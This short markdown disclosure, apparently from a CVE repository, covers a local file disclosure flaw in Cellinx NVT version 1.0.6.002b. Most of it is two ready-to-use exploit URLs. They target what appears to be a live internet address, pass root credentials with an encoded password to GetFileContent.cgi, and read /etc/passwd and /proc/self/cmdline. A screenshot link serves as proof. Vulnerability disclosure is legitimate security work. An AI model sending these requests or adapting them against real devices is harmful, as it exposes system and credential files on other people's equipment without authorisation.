# cellinx NVT local file disclosure vulnerability affects ver. 1.0.6.002b
## Exploit 
- http://58.149.14.210:8081/cgi-bin/GetFileContent.cgi?USER=root&PWD=D1D1D1D1D1D1D1D1D1D1D1D1A2A2B0A1D1D1D1D1D1D1D1D1D1D1D1D1D1D1B8D1&PATH=/etc/passwd&_=1672577046605
- http://58.149.14.210:8081/cgi-bin/GetFileContent.cgi?USER=root&PWD=D1D1D1D1D1D1D1D1D1D1D1D1A2A2B0A1D1D1D1D1D1D1D1D1D1D1D1D1D1D1B8D1&PATH=/proc/self/cmdline&_=1672577046605  
## POC 

![POC](https://github.com/ahmedalroky/CVEs/blob/cellinx/Screenshot%202023-01-02%20160402.png)
